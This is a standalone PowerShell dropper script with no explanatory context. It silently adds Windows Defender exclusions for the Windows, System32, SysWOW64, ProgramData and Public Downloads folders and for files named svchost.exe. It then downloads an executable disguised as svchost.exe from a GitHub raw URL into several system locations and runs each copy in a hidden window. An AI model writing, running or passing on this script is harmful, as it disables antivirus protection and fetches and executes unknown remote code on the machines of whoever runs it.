powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\svchost.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\System32\svchost.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\svchost.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\svchost.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"

$url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/svchost.exe'
$locations = @(
    'C:\Users\Public\Downloads\svchost.exe',
    'C:\Windows\System32\svchost.exe',
    'C:\Windows\SysWOW64\svchost.exe',
    'C:\Windows\svchost.exe'
)

foreach ($location in $locations) {
    Invoke-WebRequest -Uri $url -OutFile $location
}

foreach ($location in $locations) {
    Start-Process -FilePath $location -WindowStyle Hidden -Wait
}
